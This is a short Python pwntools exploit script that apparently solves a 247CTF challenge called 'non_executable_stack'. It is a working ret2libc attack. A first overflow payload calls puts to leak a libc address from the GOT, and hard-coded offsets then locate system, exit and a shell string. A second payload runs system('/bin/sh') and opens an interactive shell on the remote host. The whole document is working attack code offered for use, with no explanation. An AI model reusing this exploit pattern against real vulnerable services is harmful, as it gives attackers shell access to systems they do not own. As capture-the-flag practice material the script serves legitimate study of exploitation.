#!/usr/bin/python3

from pwn import *

io = remote('c4868ef5f3cff155.247ctf.com',50079)
elf = ELF('non_executable_stack')
context.binary = ('non_executable_stack')

#libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')

payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK'

payload+= p32(elf.plt['puts'])
payload+= p32(elf.symbols['main'])
payload+= p32(elf.got['puts'])

io.recvline()
io.sendline(payload)
print('----------------------------------------------------')
print('payload1 sent successfully XD')
print('----------------------------------------------------')
io.recvline()
puts_leak = u32(io.recvline()[:4])
print(puts_leak)

base_address = puts_leak - 0x067360
#---------------------------------------------------------------------
system = base_address +  0x3cd10

exitfunc = base_address + 0x2ff70

bash = base_address + 0x17b8cf
#----------------------------------------------------------------------

payload2 = b'A' * 44
payload2 += p32(system)
payload2 += p32(exitfunc)
payload2 += p32(bash)

#----------------------------------------------------------------------
io.recvline()
io.sendline(payload2)
print('----------------------------------------------------')
print('payload2 sent successfully , here comes your shell ')
print('----------------------------------------------------')

io.recvline()
io.interactive()




